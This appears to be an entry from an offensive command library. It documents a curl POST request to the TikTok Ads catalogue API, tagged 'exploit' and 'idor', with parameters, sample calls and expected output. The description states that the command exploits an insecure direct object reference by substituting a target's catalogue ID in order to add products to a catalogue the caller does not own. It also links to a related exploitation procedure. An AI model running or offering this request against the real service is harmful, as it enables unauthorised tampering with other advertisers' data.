---
data: >-
  curl -X POST
  'https://ads.tiktok.com/api/v1/catalogue/{target_catalogue_id}/products' -H
  'Authorization: Bearer {your_token}' -H 'Content-Type: application/json' -d
  '{"product_name": "Test Product", "price": 99.99}'
tags:
  - http
  - api
  - exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.727Z'
id: 4c1848be-2ba3-498a-b4fb-3a8a62b91ad2
verified: false
validated: true
submitted: true
---
# curl-add-product-to-catalogue

## Command

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/catalogue/{target_catalogue_id}/products' \
  -H 'Authorization: Bearer {your_token}' \
  -H 'Content-Type: application/json' \
  -d '{"product_name": "Test Product", "price": 99.99}'
```

## Description

This curl command sends a POST request to the TikTok Ads API to add a product to a specified catalogue, useful for exploiting IDOR by substituting the target catalogue ID. It authenticates with a bearer token and submits JSON data for the product.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | The API endpoint with catalogue ID placeholder | Yes |
| `-H 'Authorization: Bearer {your_token}'` | Authentication header with session token | Yes |
| `-H 'Content-Type: application/json'` | Sets request body type to JSON | Yes |
| `-d '{json_payload}'` | JSON data for the product details | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/catalogue/12345/products' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...' \
  -H 'Content-Type: application/json' \
  -d '{"product_name": "Basic Product", "price": 50}'
```

### Advanced Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/catalogue/12345/products' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...' \
  -H 'Content-Type: application/json' \
  -d '{"product_name": "Advanced Product", "description": "Full details", "price": 100, "category": "Electronics"}'
```

## Expected Output

Successful execution returns a JSON response like {"status": "success", "message": "Product added", "product_id": "67890"}, with HTTP status 200 or 201. Errors may include 403 if authorization fails or 400 for invalid JSON.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-Ads-Catalogue]]
